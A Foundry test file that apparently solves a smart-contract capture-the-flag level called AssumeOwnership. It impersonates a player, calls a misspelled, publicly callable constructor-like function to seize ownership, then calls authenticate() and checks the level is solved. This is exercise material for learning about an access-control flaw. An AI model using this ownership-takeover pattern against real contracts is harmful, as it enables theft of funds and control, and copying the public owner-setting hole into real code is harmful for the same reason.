// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/miscellaneous/AssumeOwnership.sol";
import "forge-std/console.sol";

// forge test --match-contract AssumeOwnershipTest -vvvv
contract AssumeOwnershipTest is Test {
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testAssumeOwnershipHack() public {
        /****************
         * Factory setup *
         *************** */
        AssumeOwnershipChallenge assumeOwnership = new AssumeOwnershipChallenge();
        vm.startPrank(player);
        assumeOwnership.AssumeOwmershipChallenge();
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        assumeOwnership.AssumeOwmershipChallenge();
        assumeOwnership.authenticate();
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = assumeOwnership.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
